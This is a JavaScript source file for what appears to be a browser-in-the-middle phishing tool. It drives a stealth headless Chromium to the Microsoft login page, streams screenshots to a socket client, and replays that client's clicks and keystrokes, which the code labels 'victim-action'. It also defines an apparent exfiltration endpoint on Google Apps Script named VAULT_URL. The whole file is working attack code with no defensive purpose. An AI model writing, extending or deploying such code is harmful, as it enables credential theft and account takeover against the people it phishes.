// USE PUPPETEER-CORE TO AVOID VERSION CONFLICTS
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
const TARGET = "https://login.microsoftonline.com/";

async function startSession(io, socket) {
    let browser = null;

    try {
        browser = await puppeteer.launch({
            // PATH TO NIX CHROMIUM
            executablePath: '/usr/bin/chromium', 
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-zygote',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        
        // Immediate redirect to clear the "Initializing" UI
        await page.goto(TARGET, { waitUntil: 'domcontentloaded' });

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        socket.on('victim-action', async (d) => {
            try {
                if (d.type === 'click') await page.mouse.click(d.x, d.y);
                if (d.type === 'key') await page.keyboard.press(d.key);
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
